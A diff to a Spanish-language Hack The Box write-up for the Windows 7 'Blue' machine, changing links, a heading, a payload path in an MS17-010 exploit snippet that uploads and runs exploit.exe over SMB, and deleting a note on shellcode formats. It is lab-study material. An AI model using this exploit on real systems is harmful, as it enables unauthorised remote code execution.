@@ -20,7 +20,7 @@ keywords:
 
 - 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Windows/Blue)
 - 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=_rycwPBeG7Q)|[Parte2](https://www.youtube.com/watch?v=6rzA9KYjFmI)|[Parte3](https://www.youtube.com/watch?v=8g8bSn6Bi7E)
-- 🧠 **Explicación resumida**: 
+- 🧠 **Explicación resumida**: [Link](https://www.youtube.com/watch?v=5GvWlEA5vsY)
 
 ---
 
@@ -74,7 +74,7 @@ Usuario:Harris
 Computadora windows 7
 
 --------
-# Escaneo de [[NMAP Scripts]] [[smb]]
+# Escaneo de [[NMAP Scripts]] a [[smb]]
 
 Como vemos que esta corriendo un [[smb]] vamos a ejecutar los [[NMAP Scripts]] que analizan vulnerabilidades sobre [[smb]]
 ```
@@ -130,7 +130,7 @@ def smb_pwn(conn, arch):
     #fid2 = smbConn.createFile(tid2, '/pwned.txt')
     #smbConn.closeFile(tid2, fid2)
     #smbConn.disconnectTree(tid2)
-    smb_send_file(smbConn, '/home/bunzo/Desktop/Blue/content/MS17-010/exploit.exe', 'C', '/exploit.exe')
+    smb_send_file(smbConn, '/home/bunzo/Desktop/exploit.exe', 'C', '/exploit.exe')
     service_exec(conn, r'cmd /c c:\\exploit.exe')
     #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
     #service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
@@ -153,10 +153,6 @@ Ya estamos dentro de la maquina, ahora solo falta catear las flags con [[type]]
 
 ----------
 # Notas
-
-El exploit espera un archivo **binario puro** porque solo necesita el código que se va a ejecutar directamente en memoria, sin ningún extra.
-Un `.exe` tiene toda la estructura de un programa (encabezados, secciones, etc.) que no sirve para inyección directa; el exploit no puede procesar ni entender ese formato completo.
-Además, el `.exe` es para cuando querés que un usuario lo ejecute manualmente, no para inyectarlo directamente en memoria como hace el exploit. Por eso, para exploits se usa el `.bin` con solo el shellcode.
 
 #### Puede ser que tengas error con impacket y python 2.7 al ejecutarlo. Yo lo que hice fue esto para poder ejecutar los scripts. Que es basicamente descargar y instalar el python con nuevas configuraciones
 ```shell
